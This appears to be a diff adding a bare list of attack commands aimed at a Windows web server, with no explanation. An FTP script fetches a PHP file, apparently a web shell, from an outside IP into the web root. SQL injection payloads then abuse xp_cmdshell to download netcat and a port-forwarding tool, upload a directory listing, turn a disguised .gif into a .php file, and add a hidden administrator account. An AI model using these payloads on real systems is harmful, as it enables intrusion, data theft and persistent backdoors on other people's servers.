@@ -1,0 +1,19 @@
+echo open 202.9.39.84>d:\ftp.txt
+echo 123>>d:\ftp.txt 
+echo 123>>d:\ftp.txt 
+echo get php.php D:\wwwroot\hlmtadmin\wwwroot\infoii.php>>d:\ftp.txt 
+echo bye>>d:\ftp.txt 
+ftp -s:d:\ftp.txt 
+
+';exec master.dbo.xp_cmdshell 'echo open 202.9.39.84>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo 123>>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo 123>>d:\ftp.txt';--
+';exec master.dbo.xp_cmdshell 'echo get nc.exe D:\nc.exe>>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo get lcx.exe D:\lcx.exe>>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo get php.exe D:\wwwroot\hlmtadmin\wwwroot\aaa.php>>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo put d:\dir.txt>>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo bye>>D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'echo ftp -s:D:\wwwroot\hlmtadmin\wwwroot\ftp.php>d:\ftp.bat';--
+';exec master.dbo.xp_cmdshell 'copy d:\wwwroot\school\wwwroot\fckeditor\editor\filemanager\file\file\2014.gif D:\wwwroot\hlmtadmin\wwwroot\ii.php';--
+';exec master.dbo.xp_cmdshell 'ftp -s:D:\wwwroot\hlmtadmin\wwwroot\ftp.php';--
+';exec master.dbo.xp_cmdshell 'net user luoxiao 1752393 & net localgroup administrators luoxiao /add';--
